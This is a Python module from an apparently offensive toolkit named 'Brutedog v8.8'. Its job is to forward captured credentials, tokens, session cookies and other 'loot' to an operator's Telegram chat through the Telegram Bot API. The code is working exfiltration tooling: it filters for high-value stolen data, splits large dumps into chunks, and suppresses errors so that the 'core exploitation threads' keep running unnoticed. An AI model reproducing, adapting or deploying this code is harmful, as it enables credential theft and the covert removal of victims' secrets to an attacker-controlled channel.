#!/usr/bin/env python3
"""
TELEGRAM_NOTIFIER.PY v8.8 — Centralized Zero-Noise Telemetry & Alert Dispatcher (Elite Red Team Adversarial Edition)
Features:
- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
- Asynchronously dispatches captured credentials, tokens, session cookies, and high-value loot to Telegram.
- Automatic HTML escaping and safe chunking for payloads exceeding Telegram's length limit.
- Resilient non-blocking exception handling to keep core exploitation threads uninterrupted.
"""
import os
import asyncio
import httpx
from typing import Union
import html

# Configuration via Environment Variables with dual fallbacks
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", os.getenv("BRUTEDOG_TG_TOKEN", "YOUR_BOT_TOKEN_HERE"))
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", os.getenv("BRUTEDOG_TG_CHAT", "YOUR_CHAT_ID_HERE"))

# Keywords required to pass the zero-noise filter (must contain high-value exploit indicators)
HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
]

def _escape_html(text: str) -> str:
    """Safely sanitize text to prevent Telegram HTML parse failures on special characters."""
    return html.escape(str(text))

async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
    """
    Asynchronously dispatches verified high-value loot to Telegram. 
    Enforces a strict zero-noise filter to eliminate low-priority chatter.
    """
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return  # Silent pass if telemetry destination is unconfigured

    # Zero-Noise Filtering Gate: Verify loot type or details contain elite signal
    check_str = f"{loot_type} {str(details)}".lower()
    if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
        return  # Suppress low-value or noisy telemetry messages completely

    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Format and sanitize dictionary fields or raw strings
    if isinstance(details, dict):
        lines = []
        for k, v in details.items():
            safe_key = _escape_html(k)
            safe_val = _escape_html(v)
            lines.append(f"• <b>{safe_key}</b>: <code>{safe_val}</code>")
        details_str = "\n".join(lines)
    else:
        details_str = f"<code>{_escape_html(details)}</code>"

    base_header = (
        f"🚨 <b>BRUTEDOG V8.8 — VERIFIED EXPLOIT LOOT</b> 🚨\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
    )
    footer = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    full_message = base_header + details_str + footer

    # Handle Telegram's 4096 character message limit by chunking large payloads
    max_chunk_size = 3900
    messages = []
    
    if len(full_message) > max_chunk_size:
        chunks = [details_str[i:i+max_chunk_size] for i in range(0, len(details_str), max_chunk_size)]
        for idx, chunk in enumerate(chunks, 1):
            messages.append(
                f"🚨 <b>BRUTEDOG V8.8 [Part {idx}/{len(chunks)}]</b> 🚨\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
                f"{chunk}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
    else:
        messages = [full_message]

    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            for msg in messages:
                payload = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": msg,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }
                await client.post(api_url, json=payload)
                if len(messages) > 1:
                    await asyncio.sleep(0.3)  # Rate-limit safety pause between chunks
    except Exception:
        # Suppress network exceptions to ensure core exploitation threads remain uninterrupted
        pass
